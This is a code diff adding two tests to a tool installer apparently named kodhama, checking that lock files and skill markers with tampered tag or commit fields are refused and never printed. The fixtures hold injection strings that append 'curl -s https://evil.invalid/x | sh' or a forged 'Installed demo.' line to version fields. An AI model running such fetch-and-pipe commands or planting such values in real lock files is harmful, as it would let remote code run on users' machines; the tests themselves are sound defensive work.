@@ -81,6 +81,53 @@ test("a lock with a tool, skill or file name that leaves its folder is refused, 
   }
 });
 
+test("a lock whose tag or commit is not one kodhama writes is refused, so neither reaches a printed command", (t) => {
+  const machine = scratch(t);
+  machine.fakeTool("demo", ["0.1.0"]);
+
+  for (const change of [
+    { tag: "v0.1.0 && curl -s https://evil.invalid/x | sh #" },
+    { tag: "v0.1.0\nInstalled demo." },
+    { commit: "0; curl -s https://evil.invalid/x | sh" },
+  ]) {
+    writeFiles(machine.data, { "kodhama/lock.json": `${JSON.stringify({ lock: 1, tools: { demo: entry(change) } })}\n` });
+    for (const verb of ["install", "update", "remove"]) {
+      const outcome = machine.kodhama([verb, "demo"]);
+      assert.equal(outcome.status, 1, `${verb} ${JSON.stringify(change)}`);
+      assert.match(outcome.stderr, /not a lock this kodhama can read/, verb);
+      assert.ok(!outcome.stderr.includes("curl"), outcome.stderr);
+    }
+  }
+});
+
+test("a skill folder whose marker carries a tag or commit kodhama never writes is not the tool's, and its tag is never printed", (t) => {
+  const machine = scratch(t);
+  const tool = machine.fakeTool("demo", ["0.1.0", "0.2.0"]);
+  assert.equal(machine.kodhama(["install", "demo#0.1.0"]).status, 0);
+
+  for (const marker of [
+    { tag: "v0.1.0 && curl -s https://evil.invalid/x | sh #", commit: tool.commit("v0.1.0") },
+    { tag: "v0.1.0\nInstalled demo.", commit: tool.commit("v0.1.0") },
+    { tag: "v0.2.0", commit: "0; curl -s https://evil.invalid/x | sh" },
+  ]) {
+    const alpha = join(machine.claudeSkills, "alpha");
+    writeFiles(alpha, { ".kodhama-skill.json": `${JSON.stringify({ tool: "demo", skill: "alpha", ...marker })}\n` });
+    const before = machine.state();
+    for (const args of [["update", "demo"], ["install", "demo"], ["install", "demo", "--harness", "claude"]]) {
+      const outcome = machine.kodhama(args);
+      assert.equal(outcome.status, 1, `${args.join(" ")} ${JSON.stringify(marker)}`);
+      assert.ok(!outcome.stderr.includes("curl") && !outcome.stderr.includes("Installed demo."), outcome.stderr);
+      assert.ok(!outcome.stderr.includes("Finish that update"), outcome.stderr);
+      assert.deepEqual(machine.state(), before, args.join(" "));
+    }
+  }
+  // remove leaves the folder alone, naming it, and never echoes its tag.
+  const removed = machine.kodhama(["remove", "demo"]);
+  assert.ok(!`${removed.stdout}${removed.stderr}`.includes("curl"), removed.stdout);
+  assert.ok(removed.stdout.includes(`Left ${join(machine.claudeSkills, "alpha")} alone`), removed.stdout);
+  assert.ok(existsSync(join(machine.claudeSkills, "alpha")));
+});
+
 test("a run lock whose token is no longer ours survives our release", (t) => {
   const machine = scratch(t);
   const path = join(machine.data, "kodhama", "run.lock");
